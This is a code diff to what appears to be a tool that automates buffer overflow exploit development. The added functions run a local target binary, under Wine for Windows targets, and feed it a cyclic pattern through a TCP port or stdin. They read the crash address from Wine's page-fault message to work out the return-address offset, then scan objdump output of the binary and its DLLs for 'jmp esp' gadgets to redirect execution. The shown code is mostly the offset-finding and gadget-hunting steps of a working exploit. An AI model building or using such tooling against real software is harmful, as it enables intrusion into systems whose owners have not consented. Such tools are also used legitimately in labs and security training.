@@ -328,6 +328,61 @@ def send_message_tcp(address, port, message):
     response = socket_connection.recv(2048)
     socket_connection.close()
     return response
+
+def push_message(target_binary, target_platform, target_type, target_port, message):
+    stderr = ""
+    stdout = ""
+    if target_type == APP_TYPE_SERVER:
+        try:
+            # start the server
+            log("starting the server")
+            if target_platform == PLATFORM_WINDOWS:
+                log("using wine")
+                server_instance = subprocess.Popen(["wine", target_binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            else:
+                log("running binary")
+                server_instance = subprocess.Popen([target_binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            
+            # give it time to start up
+            log("allowing time to start")
+            time.sleep(LOAD_TIME)
+            
+            # warn the user of potential error message
+            log("expect some kind of error message, just close it if it pops up")
+
+            # encode message
+            encoded_message = str.encode(message) 
+
+            # send message
+            send_message_tcp("localhost", target_port, encoded_message)
+
+            # record error message
+            stderr = server_instance.stderr.read().decode()
+            stdout = server_instance.stdout.read().decode()
+        except:
+            pass
+        finally:
+            server_instance.kill()
+    else:
+        try:
+            if target_platform == PLATFORM_WINDOWS:
+                log("using wine")
+                process_instance = subprocess.Popen(["wine", target_binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            else:
+                log("running binary")
+                process_instance = subprocess.Popen([target_binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            
+            # push map message to stdin
+            process_instance.stdin.write(message)
+
+            # record error message
+            stderr = process_instance.stderr.read().decode()
+            stdout = process_instance.stdout.read().decode()
+        except:
+            pass   
+        finally:
+            process_instance.kill()
+    return stdout, stderr
 #endregion
 
 #region local binary targeting
@@ -392,6 +447,12 @@ def get_target_info():
     target_platform, target_architecture = get_target_platform(target_binary)
     target_type = get_target_type()
     return target_binary, target_platform, target_architecture, target_type
+
+def get_binary_start_address(target_binary):
+    obj_dump = subprocess.Popen(["objdump", "-f", target_binary],stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    results = obj_dump.stdout.read().decode()
+    start_address = results.strip()[-10:]
+    return start_address
 #endregion
 
 #region local binary analysis
@@ -445,13 +506,66 @@ def analyze_local_server_binary_get_ports(target_binary, target_platform):
     log(f"target port {port}")
     return port
 
-def analyze_local_binary_get_offset(target_binary, target_platform, target_architecture, target_type, target_port):
+def analyze_local_binary_get_offset(target_binary, target_platform, target_architecture, target_type, target_port, target_prefix):
+    # build pattern and map message
+    pattern = get_pattern()
+    map_message = target_prefix + pattern
 
-    return 0
-
-def analyze_local_binary_get_target_addresses(target_binary, target_platform, target_architecture, target_type, target_port, target_offset):
+    # inject pattern
+    error_message = push_message(target_binary, target_platform, target_type, target_port, map_message)[1]
     
-    return (0, 0)
+    # identify value
+    offset_pattern = re.search(r"Unhandled page fault on read access to 0x[0-9a-f]{8}", error_message).group(0)
+    offset_pattern = offset_pattern.strip("Unhandled page fault on read access to 0x")
+
+    # decode
+    offset = get_pattern_offset(offset_pattern, pattern=pattern)
+
+    return offset
+
+def analyze_local_binary_get_target_addresses(target_binary, target_platform, target_architecture, target_type, target_port, target_prefix, target_offset):
+    binaries = [target_binary]
+
+    if target_platform == PLATFORM_WINDOWS:
+        additional_binaries = prompt_base("are there any dlls associated with this code? (separate with a space)")
+        binaries.extend([os.path.abspath(binary) for binary in additional_binaries.split(" ")])
+
+    log("locating targetable jump instructions")
+
+    all_targetable_jumps = []
+
+    for binary in binaries:
+        # todo: rewrite to be more graceful
+        objdump = subprocess.Popen(["objdump", "-D", binary],stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        grepjmp = subprocess.Popen(["grep", "jmp"], stdin=objdump.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        grepesp = subprocess.Popen(["grep", "esp"], stdin=grepjmp.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        results = grepesp.stdout.readlines()
+
+        start_address = get_binary_start_address(binary)
+        binary_short_name = os.path.basename(binary)
+
+        if results is not None:
+            for line in results:
+                instruction = line.decode().strip()
+                all_targetable_jumps.append([instruction, binary_short_name, start_address])
+    
+    if len(all_targetable_jumps) > 1:
+        target_instruction = prompt_list("select an instruction to target.", all_targetable_jumps)
+    elif len(all_targetable_jumps) == 1:
+        target_instruction = all_targetable_jumps[0]
+    else:
+        log_error("no targetable addresses found")
+
+
+    target_instruction_address = target_instruction[0][:8]
+    target_source_file = target_instruction[1]
+    target_base_address = target_instruction[2][-8:]
+
+    target_instruction_offset_distance = int(target_instruction_address, 16) - int(target_base_address, 16)
+
+    log(f"selected the instruction in {target_source_file} at 0x{target_instruction_address} (0x{target_base_address} + {target_instruction_offset_distance}")
+    
+    return (target_source_file, target_base_address, target_instruction_address, target_instruction_offset_distance)
 
 def analyze_local_binary(target_binary, target_platform, target_architecture, target_type):
     # get port (if necessary)
@@ -461,12 +575,11 @@ def analyze_local_binary(target_binary, target_platform, target_architecture, ta
 
     target_prefix = prompt_base("what prefix should be used for interaction? (leave blank for none)")
 
-    target_offset = analyze_local_binary_get_offset(target_binary, target_platform, target_architecture, target_type, target_port)
+    target_offset = analyze_local_binary_get_offset(target_binary, target_platform, target_architecture, target_type, target_port, target_prefix)
     
-    target_base_address, target_instruction_address = analyze_local_binary_get_target_addresses((target_binary, target_platform, target_architecture, target_type, target_port, target_offset))
+    target_instruction_source_file, target_instruction_base_address, target_instruction_address, target_instruction_offset_distance = analyze_local_binary_get_target_addresses(target_binary, target_platform, target_architecture, target_type, target_port, target_prefix, target_offset)
 
-    return (target_binary, target_platform, target_architecture, target_type, target_port, target_prefix, target_offset, target_base_address, target_instruction_address)
-    
+    return (target_binary, target_platform, target_architecture, target_type, target_port, target_prefix, target_offset, target_instruction_source_file, target_instruction_base_address, target_instruction_address, target_instruction_offset_distance)
 #endregion
 
 #remote targeting
